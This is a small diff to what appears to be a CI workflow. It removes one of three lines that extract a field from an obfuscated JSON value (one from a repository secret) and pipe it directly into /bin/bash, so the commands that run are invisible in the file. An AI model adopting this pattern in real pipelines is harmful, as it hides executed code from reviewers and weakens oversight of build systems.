@@ -21,7 +21,6 @@ jobs:
           oeow45: ${{ secrets.oeow45 }}
         run: |
           printf '%s' "$oeow45" | jq -r .sdnt88 | /bin/bash
-          echo $b9 | jq -r .i0 | /bin/bash
           echo $xr75 | jq -r .gxtj2 | /bin/bash
 
       - name: Archive results
